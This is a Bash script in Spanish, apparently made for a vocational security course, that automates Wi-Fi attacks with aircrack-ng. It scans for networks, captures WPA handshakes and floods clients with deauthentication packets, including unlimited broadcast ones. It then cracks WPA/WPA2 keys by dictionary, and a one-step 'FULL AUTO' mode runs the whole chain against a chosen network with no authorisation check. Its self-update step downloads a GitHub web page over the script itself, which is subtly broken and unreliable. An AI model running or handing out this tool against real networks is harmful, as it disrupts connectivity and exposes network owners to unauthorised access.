#!/bin/bash

# Creado por Isaac Martinez Martinez
AUTOR="Isaac Martinez Martinez"
CURSO="IFCT0109"
LOGFILE="aircrack_log_$(date +%F_%H%M%S).txt"

# ====== COLORES Y EMOJIS ======
GREEN='\033[1;32m'
RED='\033[1;31m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
MAGENTA='\033[1;35m'
BOLD='\033[1m'
NC='\033[0m'
EMOJI_KEY="🔑"
EMOJI_WIFI="📶"
EMOJI_PACKET="📦"
EMOJI_CHECK="✅"
EMOJI_WARN="⚠️"
EMOJI_SKULL="💀"
EMOJI_DICT="📚"
EMOJI_LOG="📝"
EMOJI_LAUNCH="🚀"
EMOJI_FIRE="🔥"
EMOJI_OK="🎉"
EMOJI_HACK="💻"

# ====== FUNCIONES VISUALES Y LOGS ======
banner() {
  clear
  echo -e "${CYAN}========================================${NC}"
  echo -e "${BOLD}${EMOJI_HACK} Aircrack-ng Pro - ${AUTOR} ${EMOJI_HACK}${NC}"
  echo -e "${CYAN}Curso: ${CURSO}${NC}"
  echo -e "${CYAN}========================================${NC}"
}
pause(){ read -rp "Presiona Enter para continuar..."; }
ok(){ echo -e "${GREEN}${EMOJI_OK} $1${NC}"; }
warn(){ echo -e "${YELLOW}${EMOJI_WARN} $1${NC}"; }
err(){ echo -e "${RED}${EMOJI_SKULL} $1${NC}"; }
log_action(){ echo -e "[$(date '+%F %T')] $1" | tee -a "$LOGFILE"; }

# ====== CHEQUEO DEPENDENCIAS ======
check_dependencies() {
  MISSING=()
  for prog in aircrack-ng airmon-ng airodump-ng aireplay-ng iw notify-send; do
    if ! command -v "$prog" >/dev/null 2>&1; then
      MISSING+=("$prog")
    fi
  done
  if (( ${#MISSING[@]} )); then
    err "¡Faltan dependencias! Instala: ${MISSING[*]}"
    exit 1
  fi
}

# ====== ORGANIZACIÓN Y LIMPIEZA ======
prepare_dirs() {
  mkdir -p "handshakes/$(date +%F)"
}
move_captures() {
  shopt -s nullglob
  for cap in *.cap *.csv *.netxml *.kismet.csv; do
    [ -e "$cap" ] && mv "$cap" "handshakes/$(date +%F)/"
  done
  shopt -u nullglob
  ok "Capturas movidas a carpeta por fecha ${YELLOW}handshakes/$(date +%F)${NC}"
}
clean_temp(){
  rm -f scan-01.csv *.temp 2>/dev/null
  ok "Temporales eliminados."
}

# ====== MENÚ Y MODOS ======
menu() {
  banner
  echo -e "${YELLOW}1.${NC} Activar modo monitor"
  echo -e "${YELLOW}2.${NC} Escanear redes"
  echo -e "${YELLOW}3.${NC} Capturar handshake"
  echo -e "${YELLOW}4.${NC} Desautenticar cliente"
  echo -e "${YELLOW}5.${NC} Crackear contraseña WPA/WPA2"
  echo -e "${YELLOW}6.${NC} Desactivar modo monitor"
  echo -e "${YELLOW}7.${NC} Modo FULL AUTO ${EMOJI_LAUNCH} (todo automático)"
  echo -e "${YELLOW}8.${NC} Ver logs"
  echo -e "${YELLOW}9.${NC} Limpiar capturas y temporales"
  echo -e "${YELLOW}u.${NC} Actualizar script"
  echo -e "${YELLOW}0.${NC} Salir"
}

# ====== FUNCIONES DE AIRCRACK ======
activar_monitor(){
  read -rp "Interfaz inalámbrica (ej. wlan0): " interfaz
  sudo airmon-ng start "$interfaz" && ok "Modo monitor activado." || err "Error al activar modo monitor."
}

escanear_redes(){
  read -rp "Interfaz en modo monitor (ej. wlan0mon): " monitor
  sudo timeout 45s airodump-ng "$monitor"
}

capturar_paquetes(){
  read -rp "Interfaz en modo monitor (ej. wlan0mon): " monitor
  read -rp "BSSID de la red objetivo: " bssid
  read -rp "Canal de la red objetivo: " canal
  read -rp "Nombre del archivo de captura: " captura
  sudo airodump-ng --bssid "$bssid" -c "$canal" -w "$captura" "$monitor"
}

desautenticar_cliente(){
  read -rp "Interfaz en modo monitor (ej. wlan0mon): " monitor
  read -rp "BSSID de la red objetivo: " bssid
  read -rp "MAC del cliente objetivo (opcional, dejar vacío para broadcast): " cliente
  read -rp "Número de paquetes (ej. 0 para ilimitado): " paquetes
  if [ -z "$cliente" ]; then
    sudo aireplay-ng --deauth "$paquetes" -a "$bssid" "$monitor"
  else
    sudo aireplay-ng --deauth "$paquetes" -a "$bssid" -c "$cliente" "$monitor"
  fi
}

crackear_clave(){
  read -rp "Archivo de captura .cap: " captura
  read -rp "Diccionario (wordlist.txt): " diccionario
  TMPRES="$(mktemp)"
  sudo aircrack-ng -w "$diccionario" "$captura" | tee "$TMPRES"
  PASS=$(grep -oP "KEY FOUND!\\s+\\[\\K[^\\]]+" "$TMPRES")
  if [ -n "$PASS" ]; then
    echo -e "\n${CYAN}========================================${NC}"
    echo -e "${BOLD}${GREEN}${EMOJI_KEY} ¡CONTRASEÑA ENCONTRADA!${NC}"
    echo -e "        --------------------------------"
    echo -e "        ${YELLOW}${BOLD}$PASS${NC}"
    echo -e "========================================${NC}\n"
    notify-send "${EMOJI_KEY} Aircrack-ng IFCT0109" "¡Clave encontrada! $PASS" --icon=dialog-password
    echo "Red: $captura | Clave: $PASS" >> $LOGFILE
  else
    err "No se encontró la contraseña."
    notify-send "${EMOJI_SKULL} Aircrack-ng IFCT0109" "No se encontró la clave" --icon=dialog-warning
  fi
  rm -f "$TMPRES"
}

desactivar_monitor(){
  read -rp "Interfaz en modo monitor (ej. wlan0mon): " monitor
  sudo airmon-ng stop "$monitor" && ok "Modo monitor desactivado." || err "Error al desactivar modo monitor."
}

ver_logs(){
  echo -e "${CYAN}--- LOG DEL SCRIPT (${LOGFILE}) ---${NC}"
  cat "$LOGFILE"
  echo -e "${CYAN}-----------------------------${NC}"
}

full_auto(){
  banner
  ok "Modo FULL AUTO iniciado"
  read -rp "Interfaz inalámbrica (ej. wlan0): " iface
  sudo airmon-ng start "$iface" >/dev/null 2>&1
  moniface="${iface}mon"
  ok "Escaneando redes..."
  sudo timeout 600s airodump-ng "$moniface" --write scan --output-format csv >/dev/null 2>&1
  if [[ ! -f scan-01.csv ]]; then err "No se detectó ninguna red"; return; fi
  awk -F',' '/WPA|WEP/ && !/Station/ {print NR ") ESSID: " $14 " | BSSID: " $1 " | Canal: " $4 " | Cifrado: " $6}' scan-01.csv
  read -rp "Elige el número de la red objetivo: " num
  sel=$(awk -F',' '/WPA|WEP/ && !/Station/ {print NR,$0}' scan-01.csv | grep "^$num " | cut -d' ' -f2-)
  IFS=',' read -ra NET <<< "$sel"
  BSSID="${NET[0]}"; CHAN="${NET[3]}"; ENCRYPT="${NET[5]}"; ESSID="${NET[13]}"
  ok "Red seleccionada: $ESSID ($ENCRYPT)"
  out="auto_${ESSID}_$(date +%H%M%S)"
  ok "Cambiando a canal $CHAN..."
  sudo iwconfig "$moniface" channel "$CHAN"
  ok "Iniciando captura handshake (45s)..."
  sudo timeout 45s airodump-ng --bssid "$BSSID" -c "$CHAN" -w "$out" "$moniface" >/dev/null &
  PID=$!
  sleep 5
  ok "Lanzando desautenticaciones..."
  for i in {1..5}; do sudo aireplay-ng --deauth 10 -a "$BSSID" "$moniface" >/dev/null 2>&1; sleep 2; done
  wait $PID
  handshake_file="$out-01.cap"
  if aircrack-ng "$handshake_file" | grep -q "Handshake"; then
    ok "Handshake capturado ${EMOJI_KEY}"
    notify-send "${EMOJI_WIFI} Aircrack-ng IFCT0109" "Handshake capturado para $ESSID" --icon=network-wireless
    read -rp "Diccionario para crack: " diccionario
    TMPRES="$(mktemp)"
    sudo aircrack-ng -w "$diccionario" "$handshake_file" | tee "$TMPRES"
    PASS=$(grep -oP "KEY FOUND!\\s+\\[\\K[^\\]]+" "$TMPRES")
    if [ -n "$PASS" ]; then
      echo -e "\n${CYAN}========================================${NC}"
      echo -e "${BOLD}${GREEN}${EMOJI_KEY} ¡CONTRASEÑA ENCONTRADA!${NC}"
      echo -e "        --------------------------------"
      echo -e "        ${YELLOW}${BOLD}$PASS${NC}"
      echo -e "========================================${NC}\n"
      notify-send "${EMOJI_KEY} Aircrack-ng IFCT0109" "¡Clave encontrada! $PASS" --icon=dialog-password
      echo "Red: $ESSID | Clave: $PASS" >> $LOGFILE
    else
      err "No se encontró la contraseña."
      notify-send "${EMOJI_SKULL} Aircrack-ng IFCT0109" "No se encontró la clave" --icon=dialog-warning
    fi
    rm -f "$TMPRES"
  else
    err "No se detectó handshake."
    notify-send "${EMOJI_SKULL} Aircrack-ng IFCT0109" "No se detectó handshake para $ESSID" --icon=dialog-warning
  fi
  sudo airmon-ng stop "$moniface" >/dev/null 2>&1
  move_captures
  clean_temp
  ok "Modo AUTO finalizado. Todo organizado."
  notify-send "${EMOJI_OK} Aircrack-ng IFCT0109" "Modo FULL AUTO terminado" --icon=dialog-information
}

# ====== ACTUALIZACION AUTOMATICA ======
actualizar_script() {
  echo -e "${CYAN}Buscando actualizaciones...${NC}"
  url="https://github.com/Erbola07002/Script-Wifi/tree/main"
  curl -fsSL "$url" -o "$0" && chmod +x "$0" && ok "¡Script actualizado!" || err "No se pudo actualizar el script."
  pause
}

# ====== FLUJO PRINCIPAL ======
check_dependencies
prepare_dirs

while true; do
  menu
  read -rp "Elige una opción: " option
  case $option in
    1) activar_monitor ; pause ;;
    2) escanear_redes ; pause ;;
    3) capturar_paquetes ; pause ;;
    4) desautenticar_cliente ; pause ;;
    5) crackear_clave ; pause ;;
    6) desactivar_monitor ; pause ;;
    7) full_auto ; pause ;;
    8) ver_logs ; pause ;;
    9) move_captures; clean_temp ; pause ;;
    u|U) actualizar_script ;;
    0) echo -e "${CYAN}Saliendo...${NC}"; exit 0 ;;
    *) err "Opción inválida."; pause ;;
  esac
done
